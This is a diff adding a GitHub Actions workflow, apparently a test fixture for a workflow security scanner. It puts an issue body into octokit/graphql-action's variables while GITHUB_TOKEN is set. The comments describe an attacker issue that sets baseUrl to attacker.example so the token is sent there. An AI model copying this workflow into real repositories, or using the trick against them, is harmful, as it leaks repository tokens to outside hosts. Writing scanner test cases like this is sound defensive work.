@@ -1,0 +1,22 @@
+# situation: on issues, octokit/graphql-action gets the issue's body as
+#   variables, with GITHUB_TOKEN.
+# reason: a todo (the same file): the body can write the key baseUrl, which
+#   becomes an option of the request, so the token goes to the host the body
+#   names.
+# cause: the rule reads route and url of octokit/request-action, and no
+#   input of octokit/graphql-action.
+# attack: the attacker opens an issue whose body is {"baseUrl":
+#   "https://attacker.example"}.
+# attack-run-behavior: the action sends the query with the token to
+#   attacker.example.
+on: issues
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: octokit/graphql-action@v2.x
+        with:
+          query: query { viewer { login } }
+          variables: ${{ github.event.issue.body }}
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
